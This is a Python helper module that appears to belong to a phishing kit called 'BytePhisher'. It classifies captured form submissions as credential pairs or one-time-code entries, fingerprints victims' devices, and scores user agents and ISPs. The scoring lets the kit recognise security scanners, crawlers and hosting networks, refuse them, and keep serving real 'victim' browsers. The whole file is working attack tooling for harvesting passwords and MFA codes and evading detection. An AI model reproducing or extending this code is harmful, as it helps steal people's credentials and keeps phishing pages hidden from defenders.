# BytePhisher - shared classification helpers.
#
# These three things were implemented twice (server.py and proxy.py) with
# slightly different rules, so a visitor could be classified as a credential
# pair on one path and not the other. One module, one behaviour:
#
#   is_credential_pair(fields)  - did this submission contain an identity + a secret?
#   classify_device(ua)         - ios / android / windows / macos / linux / unknown
#   is_datacenter(isp)          - hosting/cloud network (shared with core/gate.py)
#
# All three are deliberately conservative: a false "credential" inflates a
# report, a false "datacenter" blocks a real visitor.
import re

# ------------------------------------------------------------- credentials --
ID_EXACT = {
    "username", "email", "login", "user", "user_name", "email_address", "user_id",
    "username_or_email", "email_or_username", "userid", "login_id", "account",
    "account_name", "account_id", "customer_id", "employee_id", "phone", "mobile",
    "phone_number", "msisdn", "identifier", "name", "fullname",
}
PW_EXACT = {
    "password", "passw", "pwd", "password_confirm", "passwd", "pass_code", "pass",
    "passphrase", "password_confirmation", "pwd_confirm", "secret", "pin",
    "pin_code", "mpin", "passcode", "current_password", "new_password",
}
ID_TOKENS = ("user", "login", "email", "mail", "account", "identifier", "phone",
             "mobile", "customer", "employee")
PW_TOKENS = ("pass", "pwd", "pin", "secret")


def _has_token(keys, tokens):
    """Token match on word boundaries.

    A plain `in` test made 'shipping' match the token 'pin' and turned a benign
    address form into a "credential pair". Boundaries fix that while still
    catching real-world names: passwd, user_pin, login-password, myPinCode.
    """
    for k in keys:
        for t in tokens:
            if re.search(rf"(^|[^a-z0-9]){t}([^a-z0-9]|$)", k):
                return True
            # camelCase / concatenated forms: myPinCode, loginPassword
            if re.search(rf"{t}(?=[A-Z0-9])", k) or k.startswith(t) or k.endswith(t):
                return True
    return False


def is_credential_pair(fields):
    """True when a submission carries an identity field AND a secret field."""
    keys = [str(k).lower() for k in (fields or {})]
    if not keys:
        return False
    if (ID_EXACT & set(keys)) and (PW_EXACT & set(keys)):
        return True
    # a filled password field plus any identity-looking field is enough
    return _has_token(keys, ID_TOKENS) and _has_token(keys, PW_TOKENS)


def credential_keys(fields):
    """The subset of field names that look like an identity or a secret.

    Boundary-aware, so "shipping" is not a PIN field and "zipcode" is not a
    code field. Used wherever a capture has no phishlet rules to go by.
    """
    out = []
    for k in (fields or {}):
        lk = str(k).lower()
        if lk in ID_EXACT or lk in PW_EXACT or _has_token([lk], ID_TOKENS) or _has_token([lk], PW_TOKENS):
            out.append(k)
    return out



OTP_RE = re.compile(r"(otp|2fa|mfa|totp|verif|code|token|auth_?code|sms_?code)", re.I)


def looks_like_otp(fields):
    """A one-time-code submission: code-shaped field names and no password."""
    keys = [str(k).lower() for k in (fields or {})]
    if not keys:
        return False
    if _has_token(keys, ("pass", "pwd")):
        return False
    return any(OTP_RE.search(k) for k in keys)


# ----------------------------------------------------------------- device ---
def classify_device(ua):
    """Coarse device class from the user-agent string."""
    ual = (ua or "").lower()
    if "iphone" in ual or "ipod" in ual:
        return "ios"
    if "ipad" in ual:
        return "ios"
    if "android" in ual:
        return "android"
    if "windows" in ual:
        return "windows"
    if "mac os" in ual or "macintosh" in ual:
        return "macos"
    if "cros" in ual:
        return "chromeos"
    if "linux" in ual or "x11" in ual:
        return "linux"
    return "unknown"


# ------------------------------------------------------------ datacenter ----
# Hosting/cloud/VPS markers. Kept in one place so core/risk.py (scoring) and
# core/gate.py (refusal) can never disagree about the same ISP.
DATACENTER_MARKERS = (
    "ovh", "hetzner", "digitalocean", "linode", "vultr", "amazon", "aws",
    "google cloud", "gcp", "microsoft azure", "azure", "oracle cloud", "alibaba",
    "tencent", "contabo", "scaleway", "leaseweb", "choopa", "serverius",
    "hostwinds", "hostinger", "namecheap", "godaddy", "colocation", "colo",
    "datacamp", "datacenter", "data center", "hosting", "vps", "vpn", "proxy",
    "cloud", "server", "dedicated", "bare metal", "m247", "psychz", "quadranet",
    "frantech", "buyvm", "racknerd", "interserver", "ionos", "1&1", "strato",
    "netcup", "gcore", "fastly", "cloudflare", "akamai", "cdn77", "stackpath",
)


def is_datacenter(isp):
    """True when the ISP/org string looks like hosting rather than an eyeball ISP."""
    low = (isp or "").lower()
    return any(m in low for m in DATACENTER_MARKERS)


# --------------------------------------------------------------- user agents --
# One list for the whole tool: the static server, the proxy and the intel
# analysis each kept their own copy, so a UA could be judged a bot in one mode
# and a human in another.
BOT_UA_MARKERS = (
    ("headlesschrome", 70), ("phantomjs", 80), ("selenium", 70), ("puppeteer", 70),
    ("playwright", 70), ("python-requests", 65), ("python-urllib", 65), ("urllib3", 65),
    ("curl/", 65), ("wget/", 65), ("go-http-client", 65), ("java/", 60),
    ("okhttp", 60), ("axios/", 60), ("node-fetch", 60), ("libwww-perl", 55),
    ("masscan", 80), ("nmap", 80), ("zgrab", 80), ("nuclei", 80), ("sqlmap", 85),
    ("nikto", 80), ("dirbuster", 70), ("gobuster", 70), ("wpscan", 70),
    ("bot", 35), ("crawler", 45), ("spider", 45), ("scrapy", 55), ("httpx", 65),
    ("aiohttp", 65), ("httrack", 60), ("postmanruntime", 40), ("insomnia", 40),
    ("cfnetwork", 55), ("guzzle", 60), ("ruby", 55), ("powershell", 65),
    ("electron/", 45), ("node/", 55), ("dart/", 55), ("httpclient", 55),
    ("restsharp", 55), ("php/", 55), ("wordpress", 55), ("facebookexternalhit", 40),
    # crawlers and automation that the intel and risk scorers also look for
    ("slimerjs", 80), ("webdriver", 70), ("httpie", 60), ("baiduspider", 45),
    ("ahrefsbot", 45), ("semrushbot", 45), ("mj12bot", 45), ("slackbot", 40),
    ("telegrambot", 40), ("whatsapp", 40), ("discordbot", 40), ("bot/", 45),
    ("spider/", 45), ("scraper", 45), ("headless", 60), ("nessus", 80),
    ("acunetix", 80), ("securityscanner", 70),
)
# a scanner marker that is not a user-agent token at all
AUTOMATION_MARKERS = tuple(m for m, _w in BOT_UA_MARKERS)
BOT_UA_EXEMPT = ("googlebot", "bingbot", "duckduckbot", "applebot", "yandexbot")


def ua_bot_score(ua, reasons=None):
    """0-100 'this user agent is not a victim's browser', with its evidence."""
    u = (ua or "").lower()
    if not u:
        if reasons is not None:
            reasons.append("no user agent at all")
        return 60
    for good in BOT_UA_EXEMPT:
        if good in u:
            return 0
    score = 0
    for marker, weight in BOT_UA_MARKERS:
        if marker in u:
            score = max(score, weight)
            if reasons is not None:
                reasons.append(f"user agent looks scripted ({marker})")
    if score and "mozilla" not in u and reasons is not None:
        reasons.append("user agent is not a browser string")
    return score


# --------------------------------------------------- navigation vs sub-resource ---
_SUBRESOURCE_TYPES = ("text/css", "image/", "font/", "video/", "audio/",
                      "application/javascript", "text/javascript", "application/font",
                      "application/wasm", "application/x-font", "text/event-stream")
_ASSET_EXT = (".css", ".js", ".mjs", ".map", ".png", ".jpg", ".jpeg", ".gif", ".webp",
              ".svg", ".ico", ".woff", ".woff2", ".ttf", ".otf", ".eot", ".mp4",
              ".webm", ".mp3", ".avif")


def accept_is_a_navigation(accept):
    """Does this Accept header belong to a document navigation (or a scripted client)?

    A browser asking for a DOCUMENT names text/html. A sub-resource fetch names the type it
    wants (text/css, image/..., application/javascript) and may add `*/*;q=0.8` as a
    fallback. Everything else - no Accept at all, a bare `*/*` (what curl sends), or a
    non-document type like application/json - is treated as a navigation.
    """
    a = (accept or "").strip().lower()
    if not a or "text/html" in a or "application/xhtml" in a:
        return True
    types = [p.split(";")[0].strip() for p in a.split(",") if p.strip()]
    return not any(t.startswith(_SUBRESOURCE_TYPES) for t in types)


def has_asset_extension(path):
    p = (path or "").split("?")[0].lower()
    return p.endswith(_ASSET_EXT)
